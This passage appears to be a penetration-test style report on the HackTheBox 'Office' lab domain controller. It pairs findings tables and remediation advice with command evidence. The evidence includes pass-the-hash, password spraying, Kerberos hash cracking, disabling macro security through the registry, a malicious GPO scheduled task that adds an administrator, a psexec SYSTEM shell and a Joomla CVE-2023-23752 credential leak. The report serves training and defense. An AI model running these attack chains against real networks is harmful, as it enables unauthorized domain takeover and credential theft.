The tester finally confirmed the domain administrators credentials with nxc, confirming complete access over the `DC.OFFICE.HTB` domain controller, and thus the entire `OFFICE.HTB` domain.
```console?prompt=$
└─$ nxc smb 10.129.230.226 -u 'Administrator' -H 'f5bxxxxxxxxxxxxxxxxxxxxxxxxxx05d' --shares
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.226  445    DC               [+] office.htb\Administrator:f5bxxxxxxxxxxxxxxxxxxxxxxxxxx05d (Pwn3d!)
SMB         10.129.230.226  445    DC               [*] Enumerated shares
SMB         10.129.230.226  445    DC               Share           Permissions     Remark
SMB         10.129.230.226  445    DC               -----           -----------     ------
SMB         10.129.230.226  445    DC               ADMIN$          READ,WRITE      Remote Admin
SMB         10.129.230.226  445    DC               C$              READ,WRITE      Default share
SMB         10.129.230.226  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.226  445    DC               NETLOGON        READ,WRITE      Logon server share 
SMB         10.129.230.226  445    DC               SOC Analysis                    
SMB         10.129.230.226  445    DC               SYSVOL          READ,WRITE      Logon server share
```

---
## Remediation Summary

With the tests and data gathered from this assessment, there exists multiple opportunities for `Office` to better its security posture. The remediation recommendations are split into three sections(short, medium, and long term), all contributing to the goal of strengthening network security. 
- Short term recommendations are those that will take minimal planning and effort to correct.
- Medium term recommendations are those that will take some time and planning to correct.
- Long term recommendations are more general, and will require discussion and longer-term planning.

#### Short Term
- [Finding #1](#1-excessive-active-directory-user-privileges) - Ensure any users and high privilege group members are using strong passwords with additional factors of authentication. 
- [Finding #2](#2-password-re-use-across-multiple-services) - Change any re-used passwords and prohibit password re-use across multiple different services.
- [Finding #3](#3-weak-active-directory-credentials) - Ensure users are following good security hygiene, including mandating strong 16+ character passwords, ideally with a forced roll-out of MFA(Multi-Factor-Authentication)
- [Finding #4](#4-sensitive-files-on-smb-network-share) - Remove any sensitive documents from network shares, this includes any files that contain credentials, pieces of authentication, or company secrets. Ensure these files are never openly stored on a share or backed up.
- [Finding #5](#5-sensitive-information-disclosure-on-vulnerable-web-service) - Update the affected service to a non-vulnerable version, ideally the latest version after a cursory audit on its security status and known vulnerabilities.

#### Medium Term
- [Finding #1](#1-excessive-active-directory-user-privileges) - Adopt the principle of least privilege (PoLP), organizing all users within AD groups according to their day-to-day duties while ensuring that the domain administrator is using a strong password that is not re-used from other services. In addition, consider implementing custom monitoring rules to log high/dangerous privilege usage via the Windows Event Log.  
- [Finding #3](#3-weak-active-directory-credentials) - Consider switching to using a managed, organization-wide password manager with company-wide password requirements that allows for the validation or generation of strong passwords. 
- [Finding #4](#4-sensitive-files-on-smb-network-share) - Discuss the implications of sensitive files on network shares within teams, putting in safeguards or locked down read/write roles on specific shares if sensitive documents MUST be shared this way.
- [Finding #6](#6-abusing-built-in-functionality-to-achieve-rceremote-code-execution) - Ensure the administrator of the service is using strong credentials. If external access to the service is necessary, consider placing the service behind a firewall, only allowing access to the administration endpoint from certain devices, IP addresses, and/or locations. 

#### Long Term
- Isolate and segmentize all web services and applications to indivisual hosts or containers. Ideally no web application, especially externally accessible ones, should ever be run on the AD Domain Controller host.  
- Adopt SSO(Single Sign On) across the entire organization, allowing password policies and MFA requirements to be set globally, company-wide and avoiding individual services from storing user credentials.
- Conduct Security Awareness workshops or seminars across the organization, training all users on healthy password management.
- Adopt additional monitoring across the organization and its networks, this includes not just performance and availability monitoring, but also network security monitor to better detect malicious activities and be able to quickly respond to security threats.

---
## Technical Findings Details:

### 1. Excessive Active Directory User Privileges

| CWE                               | [CWE-250: Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [9.1](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| Description (Incl. Root<br>Cause) | It was discovered that multiple users within the Active Directory environment had excessive privileges across the domain. One user with weak credentials was a member of the `Registry Editors` group, giving full ability to edit registry keys on a system. In another found instance, a user was a member of the `Remote Management Users` and `GPO Managers` groups, with `Remote Management Users` giving direct RDP access to machines on the domain and `GPO Managers` allowing writing over the `Default Domain Controllers Policy` of the entire domain, allowing new policies to be pushed to the GPO.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| Security Impact                   | An attacker who gains access to any of these users and their associated groups can potentially leverage them to further compromise the domain or network. The `Registry Editors` group may be used to enable un-safe Windows features or even completely disable anti-virus, monitoring software, or notifications. An attacker with group membership to `Remote Management Users` can use WinRM to directly connect to machines and get shell access, allowing the enumeration of machines, users, files, and the potential to further leverage any additional privileges accessible to the compromised user. Further, unauthorized access to the `GPO Managers` group is especially dangerous, as it allows an attacker control over the  `Default Domain Controllers Policy`, this gives the potential to add new policies to the GPO which could be in the form of a scheduled task that runs under the SYSTEM user. This over-privileged scheduled task can be leveraged to add a local administrator with attacker-known credentials to the system, giving full access over that domain-joined system to the attacker. |
| Affected Resource                 | (AD) office.htb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Remediation                       | Adopt the principle of least privilege for user accounts. Ensure users are only given privileges absolutely necessary to completing their day-to-day business related tasks. While this can be in the form of default Active Directory domain groups, ideally it would be further refined into custom groups that only gives users permissions to accomplish their necessary work. If a user absolutely must have high, or dangerous privileges, their account should be hardened and locked down to the maximum extent allowed by the organization. <br><br>Further, it is highly recommended that privileges of users and groups are constantly audited and monitored, being adjusted as needed to ensure no user is over-privileged for their tasks. Consider also adding additional monitoring through Windows default event logging that will trigger events/alerts whenever a dangerous privilege is used, this can be done through the default Windows [eventcreate](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/eventcreate) tool.                                              |
| External References               | https://attack.mitre.org/techniques/T1098/<br><br>https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |

Finding Evidence:

The tester enumerated all users on the machine and discovered that `tstark` is a member of the `Registry Editors` group.
```console?prompt=>
PS C:\Users\web_account\AppData\Local\Temp> net user tstark
net user tstark
User name                    tstark
Full Name                    
.......................

Local Group Memberships      
Global Group memberships     *Domain Users         *Registry Editors     
The command completed successfully.
```


The tester checks the registry value for MacroSecurityLevel and modifies it to disable security, proving the access granted by the `Registry Editors` group. While this can be abused to modify various Windows defaults, in this instance it was used to disable a critical OpenOffice security feature that disallows the use of macros within documents.
```console?prompt=>
PS C:\Windows\system32> Get-ItemProperty -Path HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel -Name "Value"

Value        : 3
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting\MacroSecurityLevel
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting
PSChildName  : MacroSecurityLevel
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry



PS C:\Windows\system32> New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Name "Value" -Value 0 -PropertyType DWord -Force

Value        : 0
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting\MacroSecurityLevel
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Offi
               ce.Common\Security\Scripting
PSChildName  : MacroSecurityLevel
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```



The tester leveraged a OpenOffice malicious macro to gain access to the `HHogan` user. 
```console?prompt=$
└─$ nxc smb 10.129.230.226 -u 'HHogan' -p '<REDACTED>'         
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.226  445    DC               [+] office.htb\HHogan:<REDACTED> 
```

Next, the tester then elected to run [bloodhound.py](https://github.com/dirkjanm/BloodHound.py), a collection service for the [BloodHound GUI](https://github.com/BloodHoundAD/BloodHound) application, this is an application that will use a graph database([neo4j](https://github.com/neo4j/neo4j)) to visualize user/group privileges and other relationships across the Active Directory environment. 
```console?prompt=$
└─$ python3 bloodhound.py -u 'HHogan' -p '<REDACTED>' -ns 10.129.230.226 -d office.htb -c all --zip           
INFO: Found AD domain: office.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.office.htb
<SNIP>
INFO: Found 13 users
INFO: Found 54 groups
INFO: Found 8 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.office.htb
INFO: Done in 00M 21S
INFO: Compressing output into 20240911231121_bloodhound.zip
```

The tester then loads the collection data into the BloodHound GUI tool and marked the compromised users: `dwolfe` ,`tstark`, `PPotts`, and `HHogan` before all possible outbound object control for each user was enumerated. 


The tester discovers that the `HHogan` user is a member of both the `REMOTE MANAGEMENT USERS` and `GPO MANAGERS`. `REMOTE MANAGEMENT USERS` allows the user to access computers within the domain via WinRM while `GPO MANAGERS` allows writing to the `DEFAULT DOMAIN POLICY`. 
![Bloodhound Route to Target](assets/images/office/bhound-hhogan-to-target.png)



Next, the tester used bloodhound to plot out a path from the compromised users to the Domain Controller, `DC.OFFICE.HTB`
![Bloodhound Route to Target](assets/images/office/bhound-hhogan-to-target2.png)


Due to HHogan being a member of `GPO MANAGERS`, the user has `GenericWrite` privileges over the `Default Domain Controllers Policy` allowing for a new policy to be pushed to the GPO. This was leveraged by the tester to push a policy that triggers an immediate scheduled task. 

First the tester found the GPO file path via the BloodHound-GUI tool.
![Bloodhound GPO Path](assets/images/office/bhound-gpo-path.png)

The tester then used `smbclient.py`, a tool from the impacket suite to establish a SMB session with the `SYSVOL` share on the `DC` host before navigating to the GPO and creating `Preferences\ScheduledTasks\ScheduledTasks.xml` under the `MACHINE` directory.
```console?prompt=$,#
└─$ impacket-smbclient HHogan@10.129.230.226
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# use SYSVOL
# cd OFFICE.HTB\POLICIES\{6AC1786C-016F-11D2-945F-00C04FB984F9}
# cd MACHINE
# mkdir Preferences
# cd Preferences
# mkdir ScheduledTasks
# cd ScheduledTasks
# pwd
/OFFICE.HTB/POLICIES/{6AC1786C-016F-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks
# put ScheduledTasks.xml

```

`ScheduledTasks.xml` is a scheduled task that adds the `TesterTempUser958` and makes them a local administrator. 
```xml
└─$ cat ScheduledTasks.xml 
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="TASK_15fe98c1" image="0" changed="2024-08-13 09:18:46" uid="{D741B37D-C4DC-401A-B81C-44A3F6B75D77}" userContext="0" removePolicy="0">
        <Properties action="C" name="TASK_15fe98c1" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description>MSBuild build and release task</Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                ......
				<SNIP>
				......
                <Actions Context="Author">
                    <Exec>
                        <Command>c:\\windows\\system32\\cmd.exe</Command>
                        <Arguments>/c "net user TesterTempUser958 Pssxxxxxxxxxe22 /add &amp;&amp; net localgroup administrators TesterTempUser958 /add"</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```

Next the `GPT.INI` version is incremented to reflect a GPO change before its put back on the SMB SYSVOL share for the `Default Domain Controllers Policy`.
```console?prompt=#
# pwd
/OFFICE.HTB/POLICIES/{6AC1786C-016F-11D2-945F-00C04FB984F9}
# cat GPT.INI
[General]
Version=12
# get GPT.INI
# put GPT.INI
# cat GPT.INI
[General]
Version=13
```

The tester then used the evil-winrm tool to establish a WinRM connection the `DC` host as the `HHogan` user and force a group policy update via `gpupdate`.
```console?prompt=$
└─$ evil-winrm -i 10.129.230.226 -u 'HHogan' -p '<REDACTED>'

Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\HHogan\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

The tester, still on the WinRM connection as `HHogan` confirms the new `TesterTempUser958` user was added and has administrator privileges.
```console?prompt=>
net *Evil-WinRM* PS C:\Users\HHogan\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            dlanor                   dmichael
dwolfe                   etower                   EWhite
Guest                    HHogan                   krbtgt
PPotts                   TesterTempUser958      tstark
web_account


*Evil-WinRM* PS C:\Users\HHogan\Documents> net user TesterTempUser958
User name                    TesterTempUser958

<SNIP>

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.

```

The tester then uses impacket's psexec.py to gain a remote shell session with the DC as `nt authority\system`, fully compromising the Domain Controller.
```console?prompt=$
└─$ impacket-psexec TesterTempADUser958@10.129.230.226
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.230.226.....
[*] Found writable share ADMIN$
[*] Uploading file myAgoxWF.exe
[*] Opening SVCManager on 10.129.230.226.....
[*] Creating service YezA on 10.129.230.226.....
[*] Starting service YezA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


### 2. Password Re-use Across Multiple Services

| CWE                               | [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [8.6](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Description (Incl. Root<br>Cause) | The tester discovered a re-used password across two separate web services(JoomlaDB and Active Directory domain user).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| Security Impact                   | An attacker who gain access to user credentials on the first service(JoomlaDB) can potentially use the credentials to authenticate with the second service(Active Directory domain). <br><br>With access to the Microsoft Active Directory environment, an attacker could connect potentially enumerate users across the entire AD domain, access sensitive files stored on SMB shares, or connect directly to Windows machines via protocols such as WinRDP and WinRM.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Affected Resource                 | (TCP/80) 10.129.230.226<br>(AD) office.htb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| Remediation                       | Passwords should never be re-used across different services unless facilitated through a SSO(Single Sign On) service with strong credential and additional factor authentication.<br><br>It is recommended to change the password to a long(16+ character), strong password with requirements set for numerical and special characters, ideally facilitated through a password manager than can generate/store strong random passwords with a substantially secure master password.<br><br>In the longer term, exploring SSO options within the external services is recommended. This allows users company wide to access services they are authorized to use, while allowing them to use a secure account across the services. This can reduce complexity in administration of services by allowing limitations to be set on sign-in location, devices, and sign-in frequency. Further, this allows for setting policies that require MFA organization-wide without modifying service configurations, enables better tracking of sign-in attempts, and also removes users passwords(or hashes) from being stored within the services database avoiding further credentials from leaking in case of a service-wide compromise. |
| External References               | https://attack.mitre.org/mitigations/M1027/<br><br>https://docs.joomla.org/Active_Directory_Login_Module                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |

Finding Evidence:

Previously, a vulnerable instance of the `Joomla!` web service led to sensitive information disclosure, including the clear text credentials for the `root` MySQL `joomla_db` database user.
```console?prompt=$
└─$ curl http://10.129.230.226/api/index.php/v1/config/application?public=true
{
	<SNIP>
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "root",
        "password": "<REDACTED>",
        "db": "joomla_db",
    }
	<SNIP>
}                                                                               

```


The tester sprayed the known `joomla_db` credentials across the known domain users
```console?prompt=$
└─$ ./kerbrute_linux_amd64 passwordspray -d office.htb --dc 10.129.230.226 ./valid_office_ad_users.txt '<REDACTED>'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/10/24 - Ronnie Flathers @ropnop

2024/09/10 02:09:16 >  Using KDC(s):
2024/09/10 02:09:16 >  	10.129.230.226:88
2024/09/10 02:09:16 >  [+] VALID LOGIN WITH ERROR:	 dwolfe@office.htb:<REDACTED>
2024/09/10 02:09:16 >  Done! Tested 6 logins (1 successes) in 0.236 seconds
```

The `dwolfe` Active Directory domain user was found to be using the same credentials as the `root` user for the mysql `joomla_db` database. 



### 3. Weak Active Directory Credentials

| CWE                               | [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [8.6](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Description (Incl. Root<br>Cause) | A user within the Active Directory domain was discovered to be using weak credentials. Weak or common credentials are those that can easily be 'guessed', either in the form of offline password cracking or via password 'spraying'. An AD domain-joined user with weak credentials is especially dangerous, as it typically grants access to multiple systems and services within the domain with a single sign on.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Security Impact                   | An attacker with access to AD domain-joined user accounts can potentially gain un-authorized access to machines, read sensitive files from network shares, or control services in which the user holds high privileges. In the event that an AD domain user is compromised, the attacker can spray their credentials across all services on the domain(and internal network). This can lead to unauthorized access to various systems or documents, including the potential to leverage the account to further the attackers access into a service, domain, or network.                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| Affected Resource                 | (AD) office.htb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| Remediation                       | It is recommended to change the password to a long(16+ character), strong password with requirements set for numerical and special characters, ideally facilitated through a password manager than can generate/store strong random passwords with a substantially secure master password.<br><br>To further limit the impact of a weak compromised password, it is recommended to implement MFA(Multi-Factor-Authentication) across the domain and any related services. This ensures that even if a credential was fully compromised, an attacker cannot log-into the account without an additional factor of authentication(such as temporary codes or biometrics).<br><br>In addition, consider training employees on safe password hygiene and habits, this includes things like not sharing passwords, using strong passwords, and never re-using passwords across different services or accounts unless facilitated through a SSO(Single Sign On) service with strong credential and additional factor authentication. |
| External References               | https://attack.mitre.org/techniques/T1110/<br><br>https://support.microsoft.com/en-us/windows/create-and-use-strong-passwords-c5cebb49-8c53-4f5e-2bc4-fe357ca048eb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |

Finding Evidence:

From the previously discovered sensitive packet capture in the  `SOC Analysis` SMB share, the tester was able to extract Kerberos Pre-Auth information, of which contained a crackable cipher.
![Wireshark Kerberos Pre-auth cipher](assets/images/office/kerb-preauth-cipher.png)
The cipher value was grabbed and re-arranged into a format accepted by the hashcat password cracking tool. 
```
$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf5fc
```


The cipher was successfully cracked with the hashcat tool using mode 19900(Kerberos 5, etype 18, Pre-Auth). This revealed the plain-text password for the `tstark` user.
```console?prompt=$
└─$ hashcat -m 19900 tstark.kerb.preauth /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx86f5fc:<REDACTED>
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$tstark$office.htb$a16f4806da05760af63c56...86f5fc

<SNIP>

Started: Tue Sep 10 02:40:21 2024
Stopped: Tue Sep 10 02:40:45 2024

```

The tester confirmed the credentials via authenticating to SMB
```console?prompt=$
└─$ nxc smb 10.129.230.226 -u 'tstark' -p '<REDACTED>'         
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.226  445    DC               [+] office.htb\tstark:<REDACTED>
```


### 4. Sensitive Files on SMB Network Share

| CWE                               | [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [7.6](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| Description (Incl. Root<br>Cause) | The tester discovered sensitive information on a network share. The document discovered is for the SOC Analysis team and includes a packet capture of the internal network, including multiple requests to Windows services running within the Active Directory environment. Of those, was a packet containing Kerberos Pre-Authentication information that included the pre-auth cipher, this cipher is the timestamp encrypted using a domain users password hash as the encryption key and can be 'guessed'(via password cracking) offline.                                                          |
| Security Impact                   | A tester with access to the SMB network share via an unprivileged user can potentially discover, retrieve, and analyze the packet capture using a tool such as Wireshark. The tester can then obtain the cipher field in the Kerberos pre-authentication packet and crack this offline, revealing the users plain-text password. This password may then be used to access the active directory domain as that user, including any machines, services, and network shares the user has access to.                                                                                                        |
| Affected Resource                 | (AD) office.htb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Remediation                       | Limit the storing of any sensitive information in file shares, this is especially important when the documents stored in the share contain credentials, even if these credentials as password hashes and not stored in plain-text.<br><br>Further, consider limiting permissions to each share, ideally with directories and files in each share further limited and only accessible by specific users when necessary for business operations. This can be done by ensuring stricter READ/WRITE permissions on each share, only allowing users to read and/or write to a share when strictly necessary. |
| External References               | https://attack.mitre.org/techniques/T1039/<br><br>https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |

Finding Evidence:

Using the impacket-suites `smbclient.py`, the tester connected to the `SOC Analysis` share on the `DC` host as the `dwolfe` user and enumerated the SMB share, revealing a PCAP file named `Latest-System-Dump-8fbc124d.pcap`. 
```console?prompt=$
└─$ impacket-smbclient dwolfe@10.129.230.226  
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# use SOC Analysis
# ls
drw-rw-rw-          0  Wed May 10 11:52:24 2023 .
drw-rw-rw-          0  Wed Feb 14 03:18:31 2024 ..
-rw-rw-rw-    1372860  Wed May 10 11:51:42 2023 Latest-System-Dump-8fbc124d.pcap
# get Latest-System-Dump-8fbc124d.pcap

```


The tester downloaded the packet capture file and analyzed it with Wireshark, a packet analysis tool.
![Wireshark Protocol Hierarchy Statistics](assets/images/office/Wireshark-stats.png)
FIGURE: Wireshark Protocol Hierarchy Statistics


The tester discovered another user, `tstark`, in the packets containing Kerberos authentication.
![Wireshark Kerberos Pre-auth packet](assets/images/office/wireshark-kerb-preauth.png)


Cipher discovered within the Kerberos pre-authentication packet:
![Wireshark Kerberos Pre-auth cipher](assets/images/office/kerb-preauth-cipher.png)



### 5. Sensitive Information Disclosure on Vulnerable Web Service

| CWE                               | [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [7.2](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:H/RL:O/RC:C&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| Description (Incl. Root<br>Cause) | There exists a open API endpoint that allows an unauthenticated user to retrieve the Full Name, Username, and email for all users registered on the service. Further, a request can be made to another open API endpoint that allows an unauthenticated user to retrieve the name, username, and clear-text password for the database user.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| Security Impact                   | An attacker could potentially leverage this to leak information on all registered users, this includes their full name, username, and email. This information can then be used by an attacker to start phishing campaigns against users, or even create a dictionary/list that can be used to spray passwords against the valid users. Further, an attacker leveraging this vulnerability can retrieve the username and plain-text password for the mysql database user. This can be used to spray the password for the user across multiple services, potentially allowing unauthorized access to any services where the password is re-used. If the database is exposed externally, this can give access to the database, which may grant the ability to obtain user password hashes or even inserting a new administrator account into the database. |
| Affected Resource                 | (TCP/80) 10.129.230.226                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Remediation                       | Update the affected Joomla instance to a version greater than 4.2.7. Ensure the service is periodically monitored to ensure it is up-to-date, especially in the case of publically disclosed vulnerabilities for the in-use version.<br><br>Further, to decrease the impact of a leaked password, ensure passwords are never re-used across multiple services and the mysql database for the service is not exposed externally.                                                                                                                                                                                                                                                                                                                                                                                                                         |
| External References               | https://nvd.nist.gov/vuln/detail/CVE-2023-23752                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |

Finding Evidence:

The tester fingerprinted the Joomla version by looking at the publicly accessible `joomla.xml` file on the `/administrator/manifests/files/joomla.xml` endpoint. 
```console?prompt=$
└─$ curl http://10.129.230.226/administrator/manifests/files/joomla.xml | grep 'version'    

<?xml version="1.0" encoding="UTF-8"?>
	<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
	<version>4.2.7</version>
```

The tester searched for known vulnerabilities for `Joomla v4.2.7` and discovered a [publicly known](https://www.exploit-db.com/exploits/51334) vulnerability that allowed the tester to leak the clear text credentials for the Joomla mysql database.
```console?prompt=$
└─$ curl http://10.129.230.226/api/index.php/v1/config/application?public=true

{
  "links": {
    "self": "http://10.129.230.226/api/index.php/v1/config/application?public=true",
